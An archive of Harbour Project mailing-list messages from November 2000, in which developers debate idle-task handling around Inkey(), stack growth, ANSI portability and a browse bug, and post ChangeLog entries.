have it call the background functions before calling InKey(). Then
globally change all occurrences of Inkey() in your code to MyInkey() and
avoid using Harbour functions that internally call Inkey(). It's not
only simple, but it works.

Or if there are just a few places were you want to run something once
before calling Inkey(), then just add the call ahead of the Inkey()
call. Which is even simpler.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 14:12:53 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 14:12:53 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKIEFDDHAA.ron@profit-master.com>
References: <030201c054e5$43f33470$0a0ac8c8@VECWS1>
Message-ID: <200011271911.eARJBpG02411@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Wed,
22 Nov 2000 17:28:26 -0800

> Finally, most popular Multi-Tasking O/Ss have logic to detect, and
> automatically "suspend", any task _waiting_ for I/O. I haven't read the
> logic of our KB I/O routines, to see if we use logic that will correctly
> imply such, but I understand that this can and should be done.

Harbour *never* reads from the keyboard unless a key is already
waiting, because we do *not* want the OS to block Harbour, because we
also have to check for timeouts.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 14:14:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 14:14:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEJFDHAA.ron@profit-master.com>
References: <200011271829.eARITPG31115@thor.parrett.net>
Message-ID: <200011271912.eARJCsG02526@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon, 27 Nov 2000 10:58:06 -0800

> Shove what down your throat?

Your MISCONCEPTION about how background idle task processing should work.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 14:21:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 14:21:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011271912.eARJCsG02526@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEJGDHAA.ron@profit-master.com>

David,

Please be specific, what "MISCONCEPTION"?

Any thing not working as expected? Runs slower? What is it exactly?

Ron

> > Shove what down your throat?
> 
> Your MISCONCEPTION about how background idle task processing should work.
> -- 
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.


From harbour@lists.harbour-project.org  Mon Nov 27 14:25:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 14:25:04 2000
Subject: [Harbour] 2000-11-27 08:25 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011271912.eARJCsG02526@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEJGDHAA.ron@profit-master.com>

2000-11-27 08:25 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * include/hbapi.h
   * source/rtl/idle.c
     + Added hb_idleReset()
   * source/rtl/inkey.c
     * Replaced direct idle flags reset with call to hb_idleReset()

     /* inkey.c has no reliance on any idle flags no more (other than new
U*X CPU released recently added). */

   * tests/testidle.prg
     + Added 2nd block test.

   + tests/testget.prg
     + Added test for plain gets, array gets, macro gets, and object data
gets.

   * hb_slex.bc
   * include/hbver.h
   * source/common/hbver.c
   * source/compiler/genc.c
   * source/compiler/genjava.c
   * source/compiler/genobj32.c
   * source/compiler/hbusage.c
     + Added HB_VER_LEX macro and added to Build Info.

   * config/dos/djgpp.cf
   * config/linux/gcc.cf
   * config/w32/bcc32.cf
   * config/w32/gcc.cf
     + Added -DSIMPLEX to C[LIB]FLAGS of SimpLex build


From harbour@lists.harbour-project.org  Mon Nov 27 14:42:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 14:42:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEJGDHAA.ron@profit-master.com>
References: <200011271912.eARJCsG02526@thor.parrett.net>
Message-ID: <200011271941.eARJfKG04914@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 11:22:17 -0800

> Please be specific, what "MISCONCEPTION"?

Your misconception that the background idle state processing was a
"wait state" and that the background idle processes should only execute
once per "wait state".

> Any thing not working as expected? Runs slower? What is it exactly?

It would make no difference if everything still worked identically. You
went way off track and added totally unneccesary code! You even admitted
that you had *never* used this feature. Yet for some reason you felt
eminently qualfied to change how it works. Your first attempt prevented
the background idle processing from working properly. But instead of
removing your changes, you just kept piling on more code.

Nobody asked for this change and you certainly had no use for it. So
why *did* you change how the idle processor works?
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 15:02:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 15:02:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A223FA2.31487.3F5298E@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEJHDHAA.ron@profit-master.com>

Ryszard,

>   What we have now?
> The keystroke handling manages both idle tasks handling and garbage
> collecting. Thus it needs additional information how both these
> modules work. This is what I call a complex dependencies. These
> dependencies are so complex that this handling have bugs inside. In
> some cases both garbage collecting and idle tasks will be not called
> at all. In other cases the last task can be not called at all.

Any chance you can point out what information inkey needs on "how both these
modules work"?

(Just so you can't mislead anyone, using ambiguous statements, I have
removed the *only* reference in inkey.c to any idle.c "internals" (which was
a reset of flags variables, [*commonly* shared between all of harbour sub
systems]).

For the benefit of anyone interested here is the "complex dependency"
Ryszard was referring to:

<"complex dependency">
   if( hb_vm_uiIdleTask == hb_vm_uiIdleMaxTask )
   {
      hb_vm_uiIdleTask = 0;
      hb_vm_bCollectGarbage = TRUE;
   }
</"complex dependency">

This "complex dependency" was now replaced with a call to hb_idleReset().
OTOH, while I was drafting this message, you just added U*x CPU release
support, and somehow it founds its way to inkey.c !!! Didn't you just warned
us against mixing Idle Logic with inkey???

This kind of misleading information will not serve you well!

Please tell me, what is your object here, and what is your proposed change
or fix?

>   What we have gained with this change?
> The broken modularization and hidden bugs. And this is true
> regardless how we call these idle tasks. However if they are here
> then they should be handled correctly. Sure Ron can probably fix
> these bugs at a cost of even more complex code creating a bomb that
> will explode some time later. It is not my fault that most of such
> broken rules are created by Ron - but I will disagree always with
> such practice.

1. Support for "Once per Inkey()" Idle Blocks.
2. It could help if you had an example showing these bugs, or explained what
they are.
3. You still have to show us a simpler code, that achieve the added support,
before you can claim it "complex".
4. Which "bomb"?
5. Which broken rules?
6. Strange, I didn't know I added "broken rules", I thought that the bulk of
my work has been correcting "broken rules". 7. You might want to look at
your ChangeLog and try to count the number of broken items I fixed.

> Regards, Ryszard

Let's assume for a moment, that my implementation was wrong, is that the way
to address it? Did I not invite input? Did I decline or object any
suggestion?

Few weeks back I fixed _GET_() support. You promptly changed it in Flex
build, even though it was and still is 100% correct, and 100% Clipper
compatible. In your rush, you broke GET support. First it didn't even
support macros, and  till today it still does not support objects data (try
tests/testget.prg, change the picture string and skip back to the first
get). When that happened, I offered facts and assistance, and not personal
attacks.

Similar thing happened with Early/Late binding of Macros within code block,
which is 100% Clipper compatible in SimpLex build, but still broken in Flex
build.

I hope you will realize, we are all human, if and when we error, we gain
nothing by "rubbing it in".

I sincerely respect your contribution to Harbour, and I hope you will learn
to respect mine. It appears to me you simply refuse accepting that I'm
capable of, did, do, and will continue contributing to Harbour. Please let's
find a way to co-exist, in a productive way.

Ron


From harbour@lists.harbour-project.org  Mon Nov 27 15:27:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 15:27:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011271941.eARJfKG04914@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEJIDHAA.ron@profit-master.com>

David,

> > Please be specific, what "MISCONCEPTION"?
>
> Your misconception that the background idle state processing was a
> "wait state" and that the background idle processes should only execute
> once per "wait state".

Please show where did I ever suggest that "the background idle processes
should only execute once per "wait state"."?

You'll not find it, because I never suggested it. I did suggest we should
review which mode should be the default.

> > Any thing not working as expected? Runs slower? What is it exactly?
>
> It would make no difference if everything still worked identically. You
> went way off track and added totally unneccesary code! You even admitted
> that you had *never* used this feature. Yet for some reason you felt
> eminently qualfied to change how it works. Your first attempt prevented
> the background idle processing from working properly. But instead of
> removing your changes, you just kept piling on more code.

What qualifies you to decide, that this code is "totally unnecessary code"?
I already found perfect use for it in one of my applications.

Does it take anything away? Didn't Ryszard claim:

"It is not a personal conflict. We are developing a compiler. A
compiler should give the maximum of freedom in code developing for
future user instead of forcing unneeded requirements."

1. Do you have a problem with Harbour offering this option?
2. If so, can you please explain why?
3. Do you normally consider less than a dozen lines "piling on more code"?
4. My very simple code added a new feature at practically no cost. Can you
name the cost I might be missing?
5. Will removing this code/feature gain us anything? What?

> Nobody asked for this change and you certainly had no use for it. So
> why *did* you change how the idle processor works?

1. What makes you confident I have no use for it?
2. Do you normally develop code, you don't intend to use? I never do!
3. Yes I do have use for it, and I'll bet you $1000 to $1 I'll not be the
only one using this feature by the time we ship 1.0. Let me know if you want
to take my bet.

Ron


From harbour@lists.harbour-project.org  Mon Nov 27 16:13:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 16:13:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKEJEDHAA.ron@profit-master.com>
References: <200011271814.eARIEuG29680@thor.parrett.net>
Message-ID: <200011272112.eARLCCG13306@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 10:50:45 -0800

> Sure there is. At the Harbour Application Level, each Inkey(...) is a
> "single Wait State"!

No, it's not. That's an invention of your own devising and is not how
the background idle processing was being used.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 16:21:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Mon Nov 27 16:21:02 2000
Subject: [Harbour] Browse function bug!!
References: <3A1D8FA7.28147.15B5B4CA@localhost> <000a01c056b2$f6566b40$6b7ba8c0@ssprg>
Message-ID: <3A22D003.D33D4A81@libero.it>

Hi guy (sorry I can't read your name),

I think this problems comes from dbSkip() not working as expected.
DBU.EXE has no problems and shows only three records.

regards.



 ù¥Ö ha scritto:
> 
> I have one .dbf and one deleted mark,
> It's occur error when I run browse...
> 
>   ------------------------------------------------------------------------
>                Name: TEST.PRG
>    TEST.PRG    Type: tipo non specificato (application/octet-stream)
>            Encoding: quoted-printable
> 
>                Name: TEST.DBF
>    TEST.DBF    Type: tipo non specificato (application/octet-stream)
>            Encoding: base64

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Mon Nov 27 16:30:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 16:30:03 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKAEJIDHAA.ron@profit-master.com>
References: <200011271941.eARJfKG04914@thor.parrett.net>
Message-ID: <200011272129.eARLTiG15027@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 12:28:24 -0800

> Please show where did I ever suggest that "the background idle processes
> should only execute once per "wait state"."?

Your first implementation did exactly that.

> You'll not find it, because I never suggested it. I did suggest we should
> review which mode should be the default.

Only *after* complaints that your first change broke the background
processing.

> What qualifies you to decide, that this code is "totally unnecessary code"?

What qualified you to decide that it was a needed change?
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 17:18:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Mon Nov 27 17:18:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random
 gpfs)
Message-ID: <200011271717_MC2-BC45-12F9@compuserve.com>

Ryszard,

"problem of the eval stack growth"

BTW, what is the plan to allow the CPU stack to grow as much as an
app may need?

It's easy on the OSes with VM-type APIs, but how will it be done with
a DOS Extender?

It's not much help having a nearly unlimited linked-list Eval stack
but a much more limited CPU stack.

It looks like we need to think about _both_ stacks.

John.

From harbour@lists.harbour-project.org  Mon Nov 27 17:20:05 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Mon Nov 27 17:20:05 2000
Subject: [Harbour] Win32 Sleep/SleepEx
Message-ID: <200011271717_MC2-BC45-12FA@compuserve.com>

David,

"I don't see how Harbour would be able to use the WaitMessage
function, because from what I understand, Console mode applications
don't get any Windows messages"

I think I already said that. :-)

I thought Sleep/SleepEx looked good enough.

John.

From harbour@lists.harbour-project.org  Mon Nov 27 17:24:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 17:24:03 2000
Subject: [Harbour] Win32 Sleep/SleepEx
In-Reply-To: <200011271717_MC2-BC45-12FA@compuserve.com>
Message-ID: <200011272223.eARMNnG19490@thor.parrett.net>

** Reply to message from John Skelton <John_Skelton@compuserve.com> on
Mon, 27 Nov 2000 17:17:37 -0500

> I think I already said that. :-)
> 
> I thought Sleep/SleepEx looked good enough.

Yeah, I saw that a few messages later...
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 17:33:04 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 17:33:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKAEJIDHAA.ron@profit-master.com>
References: <200011271941.eARJfKG04914@thor.parrett.net>
Message-ID: <200011272232.eARMWlG20258@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 12:28:24 -0800

> 1. What makes you confident I have no use for it?

You made this statement in your message with the Message-ID
<LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>

> Since I personally, never used such mechanism, I admit my concept of what
> could be a good use for such feature is very limited. Can some one please
> provide a real world example (outside of the GC), that utilizes this
> feature?
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 17:47:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 17:47:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKAEJIDHAA.ron@profit-master.com>
References: <200011271941.eARJfKG04914@thor.parrett.net>
Message-ID: <200011272246.eARMk3G21286@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Mon,
27 Nov 2000 12:28:24 -0800

> 2. Do you normally develop code, you don't intend to use? I never do!

I have done just that for some Harbour features and enhancements. And I
earn my living writing and maintining software that I do not intend to
use.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 19:02:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Mon Nov 27 19:02:02 2000
Subject: [Harbour] ChangeLog 2000-11-27 18:30 UTC-0400 David G. Holm <dholm@jsd-llc.com>
Message-ID: <200011280001.eAS00xG27402@thor.parrett.net>

2000-11-27 18:30 UTC-0400 David G. Holm <dholm@jsd-llc.com>
   * include/set.h
     % Changed hb_vm_bIdleRepeat to hb_set.HB_SET_IDLEREPEAT.
     % Alphabetized the hb_set structure members within type.
       NOTE: THIS CHANGE REQUIRES A CLEAN BUILD!
   * source/rtl/idle.c
     - Removed spurious hb_inkeyNext() declaration.
     % Changed hb_vm_bIdleRepeat to hb_set.HB_SET_IDLEREPEAT.
   * source/rtl/set.c
     % Changed hb_vm_bIdleRepeat to hb_set.HB_SET_IDLEREPEAT.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Mon Nov 27 19:48:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 19:48:01 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011272112.eARLCCG13306@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEJKDHAA.ron@profit-master.com>

David,

> > Sure there is. At the Harbour Application Level, each Inkey(...) is a
> > "single Wait State"!
>
> No, it's not. That's an invention of your own devising and is not how
> the background idle processing was being used.

No need to be harsh. It is perfectly legitimate for the Harbour Application
Developer, to view, each time an Inkey() is issued, as a single "Wait State"
event. Each such "Wait State" may extend *up to* a finite amount of time, or
an infinite amount of time. It is the low level Harbour guts, that
translates this single event (from the app stand point) to an undetermined
number of multiple calls to hb_idleState(), which in turn may call GC and
Idle Blocks, repeatedly, each time it is being executed.

It does not require any inventing, to realize, that any given developer, may
find it sufficient, to execute his Idle Block just once, per such single app
level event. In fact I believe once this feature is documented, more
developers are likely to use it in this mode, rather than the default
repeating mode.

Ron


From harbour@lists.harbour-project.org  Mon Nov 27 20:00:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 20:00:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <200011272232.eARMWlG20258@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEJLDHAA.ron@profit-master.com>

David,

> > 1. What makes you confident I have no use for it?
>
> You made this statement in your message with the Message-ID
> <LOBBKAFMMFGJIKLMEPAKMEGNDHAA.ron@profit-master.com>
>
> > Since I personally, never used such mechanism, I admit my
> concept of what
> > could be a good use for such feature is very limited. Can some
> one please
> > provide a real world example (outside of the GC), that utilizes this
> > feature?

Not having used something in the past, is no way an assurance that one has
no use for such! Even if we were talking about 100% identical features!

In this case, I definitely *have* use for the non repeat mode.

While I don't have any plans to use the repeat mode, I would still not
describe it as "have no use for".

Ron


From harbour@lists.harbour-project.org  Mon Nov 27 20:12:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 20:12:02 2000
Subject: [Harbour] ChangeLog 2000-11-27 18:30 UTC-0400 David G. Holm <dholm@jsd-llc.com>
In-Reply-To: <200011280001.eAS00xG27402@thor.parrett.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEJLDHAA.ron@profit-master.com>

David,

> 2000-11-27 18:30 UTC-0400 David G. Holm <dholm@jsd-llc.com>
>    * include/set.h
>      % Changed hb_vm_bIdleRepeat to hb_set.HB_SET_IDLEREPEAT.
>      % Alphabetized the hb_set structure members within type.
>        NOTE: THIS CHANGE REQUIRES A CLEAN BUILD!
>    * source/rtl/idle.c
>      - Removed spurious hb_inkeyNext() declaration.
>      % Changed hb_vm_bIdleRepeat to hb_set.HB_SET_IDLEREPEAT.
>    * source/rtl/set.c
>      % Changed hb_vm_bIdleRepeat to hb_set.HB_SET_IDLEREPEAT.

Thanks!

Ron

From harbour@lists.harbour-project.org  Mon Nov 27 21:06:02 2000
From: harbour@lists.harbour-project.org (??(SS-BBS))
Date: Mon Nov 27 21:06:02 2000
Subject: [Harbour] 2000-11-27 08:25 UTC+0800 Ron Pinkas <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKIEJGDHAA.ron@profit-master.com>
Message-ID: <002801c058df$30612cc0$6c7ba8c0@ssbbs>

>    * include/hbapi.h

Please modify file include/hbapigt.h:
These code can't compiler success of double bytes country!!

#define HB_B_SINGLE_V          0xb3 // '?
#define HB_B_SINGLE_H          0xc4 // '?
#define HB_B_DOUBLE_V          0xb3 // '?
#define HB_B_DOUBLE_H          0xc4



From harbour@lists.harbour-project.org  Mon Nov 27 21:13:02 2000
From: harbour@lists.harbour-project.org (??(SS-BBS))
Date: Mon Nov 27 21:13:02 2000
Subject: [Harbour] Browse function bug!!
References: <3A1D8FA7.28147.15B5B4CA@localhost> <000a01c056b2$f6566b40$6b7ba8c0@ssprg> <3A22D003.D33D4A81@libero.it>
Message-ID: <003601c058e0$27e96660$6c7ba8c0@ssbbs>


> Hi guy (sorry I can't read your name),

Sorry!! This is Chinese BIG-5 code!!

> 
> I think this problems comes from dbSkip() not working as expected.
> DBU.EXE has no problems and shows only three records.

May be, dbSkip() don't fix record of deleted mark.





From harbour@lists.harbour-project.org  Mon Nov 27 21:59:02 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 27 21:59:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random   gpfs)
In-Reply-To: <200011271224_MC2-BC30-EE6C@compuserve.com>
Message-ID: <3A22D8FF.12946.52980E4@localhost>

On 27 Nov 2000, at 12:24, John Skelton wrote:

> IAC, as I pointed out, Harbour has many non-ANSI functions in it.  I
> see no particular problem with getting a good stack implementation in
> return for a small amount more of such functions.

Actually, unless something changed recently, many of our 
developers have been running with the ANSI checking flag on, 
which has eliminated most non-ANSI code.

Anyway, it was like that less than 4 months ago.

It has always been our intent to have the core be ANSI.

Do you have some examples where core functionality is not ANSI 
where we have an ANSI choice?


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 27 21:59:43 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 27 21:59:43 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random  gpfs)
In-Reply-To: <3A22B549.23308.5C0BCE0@localhost>
References: <3A2260A1.33ECD317@libero.it>
Message-ID: <3A22D8FF.29183.5298167@localhost>

On 27 Nov 2000, at 19:26, Ryszard Glab wrote:

> On 27 Nov 2000, at 14:24, Maurilio Longo wrote:
> 
> > It can be done in a couple of hours, won't break existing code,
> > won't cause any new problem to DOS (which is the only platform which
> > has not virtual memory). We don't have handhelp PCs supported (we
> > barely support win32 at this time, look at linux port lacking
> > something as easy and fundamental as cpu releasing code).
 
>   And will not solve a problem of the eval stack growth. This way
> Harbour in DOS and other currently unsupported systems will not handle
> dynamic stack. 

>   Did we changed our goals to develop harbour on one specific target
> platform? Is it the road where we are heading?

I hope not. As far as I recall, the core competency of the compiler 
we are creating is Clipper 5.2 clone that runs on many platforms. I 
firmly believe that this should be the overriding concern when there 
are multiple paths to take.

>   Anyway, I am not in a position to do such OS specific changes. I can
> separate stack handling from VM code as I outlined previously.

As you know, Ryszard, I agree with you regarding core code.

But, it will open the door for OS specific optimization without much 
mess or fuss without sacrificing our original goals, so I think it is a 
wise move. It gives core capabilities a front seat and allows OS 
optimization easily. We all win.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 27 22:00:41 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 27 22:00:41 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKKEJEDHAA.ron@profit-master.com>
References: <200011271814.eARIEuG29680@thor.parrett.net>
Message-ID: <3A22D8FF.25781.5298135@localhost>

On 27 Nov 2000, at 10:50, Ron Pinkas wrote:

> David,
> 
> > There is no such thing as a "single Wait State". Each invocation of
> > hb_idleState is a *new* wait state. If an idle process doesn't want
> > or need to be executed on every wait state, then that idle process
> > needs to have code to limit how often it gets executed. Harbour's
> > idle state processor should not attempt to make that decision.
> 
> Sure there is. At the Harbour Application Level, each Inkey(...) is a
> "single Wait State"!

Nope. This is not how it worked, but it did work as expected for 
those of use who have taken advantage of this 'feature' for years.

> What is wrong with allowing such block to Run once per Inkey(), if the
> developer so desires?

Nothing as long as the default condition works EXACTLY the way it 
always has. Anything less than existing capability runs against the 
original goals of the Harbour project.

Triggering once per wait state is not how we expect or desire it to 
work.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 27 22:01:53 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 27 22:01:53 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas<ron@profit-master.com>
In-Reply-To: <200011271825.eARIPSG30730@thor.parrett.net>
References: <200011231758_MC2-BBFF-338A@compuserve.com>
Message-ID: <3A22D8FF.17777.529810C@localhost>

On 27 Nov 2000, at 13:25, David G. Holm wrote:

> > That word "idle" is surely a hint.  People appear to be talking
> > about at least 2 things: background (low priority) processing and
> > true idle time.  It may be hard to reconcile these if only one term
> > is used to mean both of them!
> 
> The entire purpose of idle time and wait states in Harbour is for
> doing low priority background processing (i.e., simulating having real
> threads by running something when Harbour is waiting for user input).

One more purpose...

Determine when there are no primary needs, no secondary needs 
and release the CPU back to the OS.

-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 27 22:02:59 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 27 22:02:59 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random   gpfs)
In-Reply-To: <200011271328_MC2-BC3F-FD44@compuserve.com>
Message-ID: <3A22D8FE.23848.52980B2@localhost>

On 27 Nov 2000, at 13:27, John Skelton wrote:

> "Until this moment we have avoided the situation when some critical
> part of harbour depends on OS specific feature"
 
> Your view isn't the same as mine.  I see lots of dependencies.  IAC,
> as I have said there's nothing to stop there being a non-OS dependent
> stack implementation as well as ones which are far better but OS-
> dependent.

But, his view corresponds with the original goal of this project. 
Understandably, you have different goals, but that doesn't mean we 
all do. In fact, every OS specific dependency takes us further from 
our original goal of creating as much core code be non-specific as 
possible.

But, you and others have made your point and I suspect that the 
opportunity to override the default memory management can be 
made simple and straightforward without sacrificing the original 
goal.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Mon Nov 27 22:53:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Mon Nov 27 22:53:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A22D8FF.25781.5298135@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEJNDHAA.ron@profit-master.com>

Phil,

> > > There is no such thing as a "single Wait State". Each invocation of
> > > hb_idleState is a *new* wait state. If an idle process doesn't want
> > > or need to be executed on every wait state, then that idle process
> > > needs to have code to limit how often it gets executed. Harbour's
> > > idle state processor should not attempt to make that decision.
> >
> > Sure there is. At the Harbour Application Level, each Inkey(...) is a
> > "single Wait State"!
>
> Nope. This is not how it worked, but it did work as expected for
> those of use who have taken advantage of this 'feature' for years.

I was not talking about any inner working, but rather an application level
view point!!!

Don't you agree, it is perfectly reasonable for any Harbour Developer to
view a single Inkey() in *his* application as a single Wait State Event?
Such developer need not know, or understand, the inner working of Harbour.

> > What is wrong with allowing such block to Run once per Inkey(), if the
> > developer so desires?
>
> Nothing as long as the default condition works EXACTLY the way it
> always has. Anything less than existing capability runs against the
> original goals of the Harbour project.

It does EXACTLY!!!

BTW, I have no objection to this, but for the sake of pedantry I must
insist, that including NanForum Toolkit compatibility, was *not* part the
original goals of the Harbour Project.

> Triggering once per wait state is not how we expect or desire it to
> work.

1. Again, it *does* so by *default*!
2. Who is "we"? I know of quiet a few of "us", that are happy to embrace a
slightly extended set of expectation and desires, that does include the
above as an option. Especially since it comes practically free.
3. I though you too agreed it might be useful.

Ron


From harbour@lists.harbour-project.org  Mon Nov 27 23:58:02 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Mon Nov 27 23:58:02 2000
Subject: [Harbour] 2000-11-23 11:11 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEJNDHAA.ron@profit-master.com>
References: <3A22D8FF.25781.5298135@localhost>
Message-ID: <3A22F4FE.30589.596DD0C@localhost>

On 27 Nov 2000, at 19:54, Ron Pinkas wrote:

> Phil,
 
> > > > There is no such thing as a "single Wait State". Each invocation
> > > > of hb_idleState is a *new* wait state. If an idle process
> > > > doesn't want or need to be executed on every wait state, then
> > > > that idle process needs to have code to limit how often it gets
> > > > executed. Harbour's idle state processor should not attempt to
> > > > make that decision.

> > > Sure there is. At the Harbour Application Level, each Inkey(...)
> > > is a "single Wait State"!

> > Nope. This is not how it worked, but it did work as expected for
> > those of use who have taken advantage of this 'feature' for years.
 
> I was not talking about any inner working, but rather an application
> level view point!!!

I am speaking of both internal and outer workings. Outer workings 
work the way they do because inner working work they way they 
do.
 
